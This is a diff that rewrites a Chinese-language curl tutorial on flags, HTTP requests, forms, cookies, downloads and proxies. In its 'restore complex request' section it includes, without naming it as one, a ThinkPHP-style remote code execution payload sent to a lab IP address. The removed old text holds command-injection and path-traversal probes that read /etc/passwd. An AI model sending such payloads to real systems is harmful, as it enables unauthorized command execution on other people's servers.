@@ -1,224 +1,429 @@
-# CURL
+# curl 使用指南
 
-cURL 是一个支持多种协议（HTTP、HTTPS、FTP 等）的命令行工具，用于发送和接收数据。
+`curl` 用于从命令行发送和接收网络数据，最常见的用途是请求 HTTP/HTTPS 接口、查看响应、提交数据、上传和下载文件。
 
-## 基本语法
+以下命令默认在 Linux/macOS 终端执行，`URL` 表示目标地址，`FILE` 表示本地文件。涉及账号、Token 或 Cookie 的命令只应在已授权的环境中使用。
 
-```bash
-curl [选项] [URL]
-```
-
-## 常用选项速查
-
-| 选项                                     | 说明                                   |
-| -------------------------------------- | ------------------------------------ |
-| `-X, --request <METHOD>`               | 指定请求方法（GET / POST / PUT / DELETE...） |
-| `-H, --header <HEADER>`                | 添加请求头                                |
-| `-A, --user-agent <STR>`               | 设置 User-Agent                        |
-| `-d, --data <DATA>`                    | 发送 POST 数据                           |
-| `--compressed`                         | 请求压缩响应                               |
-| `-F, --form <name=content>`            | 上传文件（multipart/form-data）            |
-| `-o, --output <FILE>`                  | 保存到指定文件                              |
-| `-O, --remote-name`                    | 保存为远程文件名                             |
-| `-i, --include`                        | 输出包含响应头                              |
-| `-I, --head`                           | 仅获取响应头（HEAD 请求）                      |
-| `-v, --verbose`                        | 详细输出                                 |
-| `-s, --silent`                         | 静默模式                                 |
-| `-S, --show-error`                     | 静默时仍显示错误                             |
-| `-f, --fail`                           | HTTP 错误时返回非零退出码                      |
-| `-k, --insecure`                       | 忽略 SSL 证书验证                          |
-| `--cacert <FILE>`                      | 指定 CA 证书                             |
-| `-L, --location`                       | 跟随重定向                                |
-| `-u, --user <user:password>`           | 基本认证                                 |
-| `--digest`                             | Digest 认证                            |
-| `-b, --cookie <data>`                  | 发送 Cookie                            |
-| `-c, --cookie-jar <FILE>`              | 保存 Cookie 到文件                        |
-| `-x, --proxy <[protocol://]host:port>` | 使用代理                                 |
-| `--resolve <host:port:addr>`           | 自定义 DNS 解析                           |
-| `-w, --write-out <FORMAT>`             | 自定义输出格式                              |
-| `--connect-timeout <SEC>`              | 连接超时时间                               |
-| `--max-time <SEC>`                     | 整个请求的最大时长                            |
-| `--retry <NUM>`                        | 失败重试次数                               |
-| `--retry-delay <SEC>`                  | 重试间隔时间                               |
-| `--retry-max-time <SEC>`               | 重试总时长上限                              |
-| `--retry-connrefused`                  | 连接拒绝时也重试                             |
-| `-C, --continue-at <OFFSET>`           | 断点续传                                 |
-| `--limit-rate <SPEED>`                 | 限速下载                                 |
-
-## 分类用法
-
-### 1. 请求方法
+## 1. 先确认版本
 
 ```bash
-curl http://example.com                       # GET 请求（默认）
-curl -X POST http://example.com               # POST 请求
-curl -X PUT http://example.com                # PUT 请求
-curl -X DELETE http://example.com             # DELETE 请求
-curl -I http://example.com                    # 仅获取响应头
+curl --version
+curl --help
 ```
 
-### 2. 请求头与认证
+不同版本支持的参数可能略有区别。遇到 `unknown option` 时，先以本机 `curl --help` 为准。
+
+## 2. 常用参数
+
+| 参数                      | 作用                              |
+| ----------------------- | ------------------------------- |
+| `-sS`                   | 不显示进度条，但保留错误信息                  |
+| `-v`                    | 显示请求和响应的详细过程                    |
+| `-i`                    | 在响应正文前显示响应头                     |
+| `-I`                    | 只请求响应头，常用于快速查看状态                |
+| `-f`                    | HTTP 返回 4xx/5xx 时以失败退出          |
+| `-L`                    | 跟随重定向                           |
+| `-X METHOD`             | 指定请求方法；只有确实需要时使用                |
+| `-H`                    | 添加请求头                           |
+| `-d`                    | 发送请求数据，默认使用 POST                |
+| `-F`                    | 以 multipart/form-data 形式提交表单或文件 |
+| `-o FILE`               | 将响应保存到指定文件                      |
+| `-O`                    | 按 URL 中的文件名保存                   |
+| `-u USER:PASSWORD`      | 使用 HTTP Basic 认证                |
+| `-b DATA`               | 发送 Cookie                       |
+| `-c FILE`               | 将 Cookie 保存到文件                  |
+| `-x PROXY`              | 通过代理访问                          |
+| `--connect-timeout SEC` | 设置建立连接的超时时间                     |
+| `--max-time SEC`        | 设置整个请求的最大时间                     |
+| `--retry NUM`           | 失败时重试指定次数                       |
+| `-k`                    | 跳过 HTTPS 证书校验，仅适合临时测试           |
+
+### 复杂请求常用参数
+
+| 参数                        | 作用                               |
+| ------------------------- | -------------------------------- |
+| `--compressed`            | 请求压缩响应，并自动解压 gzip、deflate 等响应    |
+| `--data-raw DATA`         | 原样发送文本，不把开头的 `@` 当作文件读取          |
+| `--data-urlencode DATA`   | 发送前对字段值进行 URL 编码                 |
+| `--data-binary @FILE`     | 按原始字节发送文件，保留换行和内容格式              |
+| `-G`                      | 把 `-d`/`--data-*` 数据放到 URL 查询字符串 |
+| `-D FILE`                 | 将响应头保存到文件，正文仍输出到终端               |
+| `--globoff`               | 禁用 URL 中 `[]`、`{}` 的通配展开         |
+| `--http1.0` / `--http1.1` | 强制使用指定 HTTP 版本                   |
+| `--trace-ascii FILE`      | 将详细收发内容写入文件，适合离线排查               |
+
+## 3. 最基本的请求
+
+GET 请求是默认行为：
 
 ```bash
-curl -H "Content-Type: application/json" http://example.com
-curl -H "Authorization: Bearer <token>" http://example.com
-curl -u username:password http://example.com            # 基本认证
-curl -b "name=value" http://example.com                 # 发送 Cookie
-curl -c cookies.txt http://example.com                  # 保存 Cookie 到文件
-curl -b cookies.txt http://example.com                  # 从文件加载 Cookie
+curl https://example.com
 ```
 
-### 3. 提交数据
+只看响应头：
 
 ```bash
-curl -d "name=value" http://example.com                              # 表单数据
-curl -d @data.json http://example.com                                # 从文件读取数据
-curl -d '{"key":"value"}' -H "Content-Type: application/json" http://example.com  # JSON
-curl -F "file=@test.txt" http://example.com                          # 文件上传
+curl -I https://example.com
 ```
 
-### 4. 文件下载
+同时查看响应头和正文：
 
 ```bash
-curl -O http://example.com/file.txt                  # 保存为原文件名
-curl -o newname.txt http://example.com/file.txt      # 指定文件名
-curl -O http://example.com/file[1-5].txt             # 批量下载
-curl -C - -O http://example.com/large.zip            # 断点续传
-curl --limit-rate 100k http://example.com/file.zip   # 限速下载
+curl -i https://example.com
 ```
 
-### 5. 输出控制
+安静输出，但仍显示错误：
 
 ```bash
-curl -s http://example.com                                        # 静默模式（无进度条）
-curl -v http://example.com                                        # 详细输出（含请求/响应头）
-curl -i http://example.com                                        # 响应包含头部
-curl -w "\n状态码: %{http_code}\n" http://example.com              # 自定义输出格式
-curl -o /dev/null -s -w "%{http_code}" http://example.com         # 仅输出状态码
-
-# 静默但显示错误（脚本调试必备）
-curl -s -S http://example.com
-
-# HTTP 错误时返回非零退出码（脚本中判断成功/失败）
-curl -f http://example.com/notfound
-
-# 组合：静默 + 出错退出（自动化脚本标准写法）
-curl -f -s -S -o /dev/null http://example.com/api
+curl -sS https://example.com
 ```
 
-### 6. 连接与代理
+URL 中包含 `&`、`?` 或空格时建议加引号：
 
 ```bash
-curl -L http://example.com                              # 跟随重定向
-curl -k https://self-signed.example.com                 # 忽略证书错误
-curl -x http://127.0.0.1:8080 http://example.com        # HTTP 代理
-curl -x socks5://127.0.0.1:1080 http://example.com      # SOCKS5 代理
-curl --connect-timeout 10 http://example.com            # 连接超时 10 秒
+curl 'https://example.com/search?q=curl&page=1'
 ```
 
-### 7. 重试与容错
+## 4. 还原复杂 HTTP 请求
+
+抓包或浏览器开发者工具复制出的请求，通常由 URL、请求头和请求体三部分组成。curl 可以重复使用多个 `-H`，请求体较复杂时使用 `--data-raw` 或 `--data-urlencode`。
+
+下面是授权靶场中的请求构造示例：
 
 ```bash
-# 最多重试 3 次，每次间隔 2 秒
-curl --retry 3 --retry-delay 2 http://unstable.example.com/api
-
-# 重试总时间不超过 30 秒（防止无限重试）
-curl --retry 5 --retry-max-time 30 http://unstable.example.com/api
-
-# 连接拒绝也重试（默认 --retry 不重试 connection refused）
-curl --retry 3 --retry-connrefused http://example.com
-
-# 设置总超时 + 失败静默退出（脚本友好的健壮请求）
-curl --max-time 10 -f -s -S http://example.com
+curl --compressed -i -sS -X POST \
+  'http://192.168.230.143:8080/index.php?s=captcha' \
+  -H 'Host: localhost' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en' \
+  -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' \
+  -H 'Connection: close' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
 ```
 
-### 8. SSL/TLS
+各部分作用：
+
+| 部分 | 作用 |
+| --- | --- |
+| `--compressed` | 告诉服务端客户端支持压缩响应，并由 curl 自动解压响应正文 |
+| `-i` | 把 HTTP 响应头和正文一起输出，便于观察状态码、Cookie 和 Content-Type |
+| `-sS` | 隐藏进度条，但保留网络错误 |
+| `-X POST` | 明确指定 POST 方法；有请求体时也可以依靠 `--data-raw` 自动使用 POST |
+| URL 中的 `?s=captcha` | 发送名为 `s` 的查询参数，和 POST 请求体是两组不同的数据 |
+| 多个 `-H` | 分别添加请求头；同名请求头重复出现时要注意服务端的处理方式 |
+| `Content-Type` | 告诉服务端请求体是 URL 编码表单格式 |
+| `--data-raw` | 原样发送后面的字符串，不将开头的 `@` 解释为文件名 |
+| `filter[]`、`server[REQUEST_METHOD]` | 表单字段名本身包含方括号，curl 会按原样发送 |
+
+终端中应使用普通 URL，不要保留聊天或 Markdown 生成的链接格式。下面这些写法是转义或展示残留，不能直接照抄：
+
+```text
+[http://example.com](http://example.com)
+\--data-raw
+\_method
+```
+
+对应的终端写法是：
+
+```text
+http://example.com
+--data-raw
+_method
+```
+
+复杂请求也可以先写成一行，确认无误后再换成多行：
 
 ```bash
-# 指定 CA 证书验证服务器（自建 CA 或企业内网）
-curl --cacert /path/to/ca-cert.pem https://example.com
-
-# 客户端证书认证（双向 TLS / mTLS）
-curl --cert client.pem --key client-key.pem https://example.com
-
-# 指定最低 TLS 版本（禁用旧协议）
-curl --tlsv1.2 https://example.com
-
-# 忽略证书验证（仅测试用，生产环境禁用）
-curl -k https://self-signed.example.com
+curl --compressed -i -sS -X POST 'http://192.168.230.143:8080/index.php?s=captcha' -H 'Host: localhost' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'Connection: close' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
 ```
 
-## 实用场景
+### 请求体参数的选择
 
-### API 测试
+普通表单字段：
 
 ```bash
-# GET API
-curl -s http://api.example.com/users | jq .
-
-# POST API（JSON）
-curl -X POST http://api.example.com/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"123456"}'
-
-# 携带 Token 访问
-curl -H "Authorization: Bearer eyJhbG..." http://api.example.com/profile
+curl -X POST https://example.com/login \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'username=alice&remember=1'
 ```
 
-### 调试与排查
+让 curl 对字段值自动编码，适合值中含空格、`&` 或中文的情况：
 
 ```bash
-# 查看完整请求/响应过程
-curl -v http://example.com
-
-# 分析各阶段耗时
-curl -w "DNS: %{time_namelookup}s | TCP: %{time_connect}s | TLS: %{time_appconnect}s | TTFB: %{time_starttransfer}s | 总耗时: %{time_total}s\n" \
-  -o /dev/null -s http://example.com
-
-# 查看 HTTPS 证书信息
-curl -vI https://example.com 2>&1 | grep -E "SSL|subject|expire"
+curl -X POST https://example.com/search \
+  --data-urlencode 'q=hello world'
 ```
 
-### Web 安全测试
+从文件发送 JSON 或其他原始内容：
 
 ```bash
-# 命令注入探测
-curl "http://target.com/?cmd=ls"
-curl "http://target.com/?cmd=cat%20/etc/passwd"
-
-# 路径遍历探测
-curl "http://target.com/?file=../../../etc/passwd"
-
-# 枚举 HTTP 方法
-curl -X OPTIONS -v http://target.com
+curl -X POST https://example.com/api \
+  -H 'Content-Type: application/json' \
+  --data-binary @request.json
 ```
 
-### 安全下载脚本
+`-d`、`--data-raw` 和 `--data-binary` 都可以发送请求体，但用途不同：`-d` 适合普通文本，`--data-raw` 适合不希望 `@` 被解释的文本，`--data-binary` 适合必须保留原始换行和字节内容的文件。
+
+### 查询参数和请求体的区别
+
+使用 `-G` 时，数据会追加到 URL，而不是放入请求体：
 
 ```bash
-# 先检查再执行
-curl http://example.com/script.sh -o check.sh
-cat check.sh        # 检查内容
-bash check.sh       # 确认安全后执行
-
-# 或直接管道查看
-curl -s http://example.com/script.sh | less
+curl -G https://example.com/search \
+  --data-urlencode 'q=hello world' \
+  --data-urlencode 'page=1'
 ```
 
-## `-w` 常用格式化变量
+这相当于请求 `https://example.com/search?q=hello+world&page=1`。
 
-| 变量 | 说明 |
-|------|------|
-| `%{http_code}` | HTTP 状态码 |
-| `%{url_effective}` | 最终请求的 URL（跟随重定向后） |
-| `%{time_total}` | 总耗时（秒） |
-| `%{time_namelookup}` | DNS 解析耗时 |
-| `%{time_connect}` | TCP 连接耗时 |
-| `%{time_appconnect}` | TLS/SSL 握手耗时 |
-| `%{time_starttransfer}` | 首字节时间（TTFB） |
-| `%{size_download}` | 下载字节数 |
-| `%{content_type}` | 响应 Content-Type |
-| `%{http_version}` | HTTP 协议版本 |
-| `%{num_redirects}` | 重定向次数 |
-| `%{redirect_url}` | 重定向目标 URL |
-| `%{ssl_verify_result}` | SSL 证书校验结果（0=成功） |
+### URL 中包含方括号或花括号
+
+curl 默认可能把 URL 中的 `[]`、`{}` 当作批量请求的通配语法。需要发送字面量时加 `--globoff`：
+
+```bash
+curl --globoff 'https://example.com/api/items[id]'
+```
+
+## 5. 查看请求是否成功
+
+curl 默认不会因为 HTTP 404 或 500 自动报错。脚本中应配合 `-f` 和 `-sS`：
+
+```bash
+curl -fsS https://example.com/api/health
+```
+
+只输出状态码：
+
+```bash
+curl -o /dev/null -sS -w '%{http_code}\n' https://example.com
+```
+
+输出状态码和最终 URL：
+
+```bash
+curl -o /dev/null -sS -L -w 'code=%{http_code} url=%{url_effective}\n' https://example.com
+```
+
+排查连接、重定向或 TLS 问题时使用详细模式：
+
+```bash
+curl -v https://example.com
+```
+
+## 6. 提交表单和 JSON
+
+提交普通表单数据：
+
+```bash
+curl -d 'username=alice&password=example' https://example.com/login
+```
+
+提交 JSON：
+
+```bash
+curl https://example.com/api/users \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"alice","role":"user"}'
+```
+
+从文件读取 JSON：
+
+```bash
+curl https://example.com/api/users \
+  -H 'Content-Type: application/json' \
+  --data-binary @data.json
+```
+
+指定 PUT 或 DELETE 请求：
+
+```bash
+curl -X PUT https://example.com/api/users/1 \
+  -H 'Content-Type: application/json' \
+  -d '{"role":"admin"}'
+
+curl -X DELETE https://example.com/api/users/1
+```
+
+`-d` 已经会将请求改为 POST，因此普通 POST 不需要再写 `-X POST`。使用 `-X` 时要确认服务确实要求该方法。
+
+## 7. 请求头、认证和 Cookie
+
+添加常见请求头：
+
+```bash
+curl https://example.com/api/profile \
+  -H 'Accept: application/json' \
+  -H 'User-Agent: my-client/1.0'
+```
+
+使用 Bearer Token：
+
+```bash
+curl https://example.com/api/profile \
+  -H 'Authorization: Bearer TOKEN'
+```
+
+使用 Basic 认证：
+
+```bash
+curl -u 'USERNAME:PASSWORD' https://example.com/protected
+```
+
+直接发送 Cookie：
+
+```bash
+curl -b 'session=VALUE' https://example.com/dashboard
+```
+
+保存并复用服务端 Cookie：
+
+```bash
+curl -c cookies.txt -d 'username=alice&password=example' https://example.com/login
+curl -b cookies.txt https://example.com/dashboard
+```
+
+不要把真实密码、Token 或 Cookie 直接提交到公共终端记录、脚本仓库或聊天记录中。
+
+## 8. 文件下载和上传
+
+指定保存路径：
+
+```bash
+curl -o output.zip https://example.com/file.zip
+```
+
+按远程文件名保存：
+
+```bash
+curl -O https://example.com/file.zip
+```
+
+跟随重定向并保存：
+
+```bash
+curl -L -o output.zip https://example.com/download
+```
+
+网络中断后继续下载：
+
+```bash
+curl -C - -O https://example.com/large-file.zip
+```
+
+上传文件：
+
+```bash
+curl -F 'file=@report.txt' https://example.com/upload
+```
+
+上传文件并附带其他表单字段：
+
+```bash
+curl -F 'file=@report.txt' -F 'description=test' https://example.com/upload
+```
+
+下载脚本或可执行文件时，先保存到本地检查内容和来源，不要直接把远程内容管道给 shell 执行。
+
+## 9. 重定向、代理和 HTTPS
+
+跟随 301/302 等重定向：
+
+```bash
+curl -L https://example.com
+```
+
+通过 HTTP 代理访问：
+
+```bash
+curl -x http://127.0.0.1:8080 https://example.com
+```
+
+通过 SOCKS5 代理访问：
+
+```bash
+curl -x socks5h://127.0.0.1:1080 https://example.com
+```
+
+设置连接和总超时：
+
+```bash
+curl --connect-timeout 5 --max-time 20 https://example.com
+```
+
+临时测试自签名证书：
+
+```bash
+curl -k https://internal.example.com
+```
+
+`-k` 会跳过证书校验，只适合明确的测试场景。生产环境应修复证书链或使用正确的 CA 证书，不要长期依赖 `-k`。
+
+## 10. 重试和脚本写法
+
+网络不稳定时重试：
+
+```bash
+curl --retry 3 --retry-delay 2 --connect-timeout 5 --max-time 30 \
+  -fsS https://example.com/api/health
+```
+
+适合脚本判断成功或失败的写法：
+
+```bash
+curl -fsS -o response.json https://example.com/api/data
+```
+
+请求成功时响应写入 `response.json`，连接失败或 HTTP 返回 4xx/5xx 时返回非零退出码。
+
+## 11. 常见问题
+
+### 返回 301 或 302，但没有看到目标页面
+
+添加 `-L` 跟随重定向：
+
+```bash
+curl -L https://example.com
+```
+
+### 返回 404/500，但命令仍显示成功
+
+curl 默认只负责完成 HTTP 交换，不会把 HTTP 错误当作命令失败。使用 `-f`：
+
+```bash
+curl -fsS https://example.com/not-found
+```
+
+### JSON 请求被服务端拒绝
+
+检查 JSON 格式，并确认添加了正确的 `Content-Type`：
+
+```bash
+curl https://example.com/api \
+  -H 'Content-Type: application/json' \
+  -d '{"key":"value"}'
+```
+
+在 shell 中，JSON 外层推荐使用单引号，避免双引号被 shell 先解析。
+
+### HTTPS 证书错误
+
+先用 `-v` 查看证书和握手信息。只有在明确是测试环境的自签名证书时，才临时使用 `-k`。
+
+### 请求一直不结束
+
+同时设置连接超时和总超时：
+
+```bash
+curl --connect-timeout 5 --max-time 20 -v https://example.com
+```
+
+## 快速记忆
+
+- 普通请求：`curl URL`
+- 调试请求：`curl -v URL`
+- 只看状态：`curl -o /dev/null -sS -w '%{http_code}\n' URL`
+- 脚本请求：`curl -fsS URL`
+- JSON 请求：`curl URL -H 'Content-Type: application/json' -d '{"key":"value"}'`
+- 下载文件：`curl -L -o FILE URL`
+- 上传文件：`curl -F 'file=@FILE' URL`
